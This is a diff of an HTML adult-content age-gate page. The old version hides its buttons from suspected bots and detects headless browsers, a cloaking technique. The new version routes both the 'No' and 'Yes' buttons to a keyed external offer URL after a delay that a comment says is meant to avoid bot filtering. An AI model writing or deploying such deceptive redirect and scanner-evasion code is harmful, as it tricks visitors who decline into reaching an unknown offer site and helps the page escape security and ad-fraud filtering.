@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adult Content Verification</title>
     <meta name="robots" content="noindex, nofollow">
+    <title>Adult Content Verification</title>
     <style>
         body {
             margin: 0;
@@ -17,9 +17,7 @@
             align-items: center;
             color: white;
             overflow: hidden;
-            user-select: none;
         }
-
         .container {
             text-align: center;
             max-width: 800px;
@@ -27,7 +25,6 @@
             position: relative;
             z-index: 2;
         }
-
         h1 {
             font-size: 3.5rem;
             margin-bottom: 2rem;
@@ -35,20 +32,17 @@
             letter-spacing: 2px;
             text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
         }
-
         .disclaimer {
             font-size: 1rem;
             margin-bottom: 3rem;
             opacity: 0.8;
         }
-
         .options {
             display: flex;
             justify-content: center;
             gap: 30px;
             margin-top: 40px;
         }
-
         .option-btn {
             width: 180px;
             height: 180px;
@@ -65,28 +59,23 @@
             position: relative;
             overflow: hidden;
         }
-
         .no-btn {
             background: white;
             color: black;
             border: 3px solid #ccc;
         }
-
         .yes-btn {
             background: black;
             color: white;
             border: 3px solid #ff0000;
         }
-
         .option-btn:hover {
             transform: scale(1.05);
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.7);
         }
-
         .option-btn:active {
             transform: scale(0.98);
         }
-
         .bg-pattern {
             position: absolute;
             top: 0;
@@ -102,7 +91,6 @@
             );
             z-index: 1;
         }
-
         .pulse {
             position: absolute;
             width: 100%;
@@ -111,25 +99,10 @@
             animation: pulse 3s infinite;
             z-index: 0;
         }
-
         @keyframes pulse {
             0% { transform: scale(0.9); opacity: 0.5; }
             50% { transform: scale(1.1); opacity: 0.2; }
             100% { transform: scale(0.9); opacity: 0.5; }
-        }
-
-        /* Anti-bot elements */
-        .bot-trap {
-            opacity: 0;
-            position: absolute;
-            left: -9999px;
-            height: 0;
-            width: 0;
-            overflow: hidden;
-        }
-
-        #real-options {
-            display: none; /* Hidden initially */
         }
     </style>
 </head>
@@ -137,83 +110,23 @@
     <div class="bg-pattern"></div>
     <div class="pulse"></div>
 
-    <!-- Invisible bot trap (placed first in DOM) -->
-    <div class="bot-trap" onclick="handleBot()">Enter</div>
-    <input type="text" class="bot-trap" name="fake-email">
-
     <div class="container">
         <h1>Are You 18+?</h1>
         <p class="disclaimer">
             This website contains adult content and is only for visitors 18 years or older.
             <br>By entering, you confirm you are of legal age.
         </p>
-        
-        <!-- Real options (hidden initially) -->
-        <div id="real-options" class="options">
-            <div class="option-btn no-btn" onclick="handleExit()">No</div>
-            <div class="option-btn yes-btn" onclick="handleAccess()">Yes</div>
-        </div>
-        
-        <!-- Loading state (shown first) -->
-        <div id="loading" class="options">
-            <div class="option-btn" style="background: transparent; border: 3px dashed #444; color: #888;">
-                Verifying...
-            </div>
+        <div class="options">
+            <div class="option-btn no-btn" onclick="redirectToOffer()">No</div>
+            <div class="option-btn yes-btn" onclick="redirectToOffer()">Yes</div>
         </div>
     </div>
 
     <script>
-        // Anti-bot variables
-        let humanVerified = false;
-        let mouseMoved = false;
-        let lastClickTime = 0;
-        
-        // Detect mouse movement (bots often don't move mouse)
-        document.addEventListener('mousemove', () => {
-            mouseMoved = true;
-        });
-
-        // Show real options after delay
-        setTimeout(() => {
-            if (mouseMoved) {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('real-options').style.display = 'flex';
-            } else {
-                handleBot();
-            }
-        }, 3500); // 3.5 second delay
-
-        // Bot detection
-        function handleBot() {
-            // Redirect bots to empty page
-            window.location.href = "/bot-detected.html";
-        }
-
-        // Human actions
-        function handleAccess() {
-            // Double-click verification
-            const now = Date.now();
-            if (lastClickTime > 0 && now - lastClickTime < 300) {
-                // Block if clicked too fast (likely bot)
-                handleBot();
-                return;
-            }
-            lastClickTime = now;
-            
-            // Proceed to site
-            window.location.href = "https://supersedeasserted.com/jmc60semv?key=d8e44b007f5a4fc5f2e96321aa7bf42c";
-        }
-
-        function handleExit() {
-            window.location.href = "https://www.google.com";
-        }
-
-        // Detect headless browsers
-        if (navigator.webdriver || 
-            !navigator.languages || 
-            window.callPhantom || 
-            window._phantom) {
-            handleBot();
+        function redirectToOffer() {
+            setTimeout(function () {
+                window.location.href = "https://supersedeasserted.com/jmc60semv?key=d8e44b007f5a4fc5f2e96321aa7bf42c";
+            }, 1500); // 1.5 seconds delay to help avoid bot filtering
         }
     </script>
 </body>
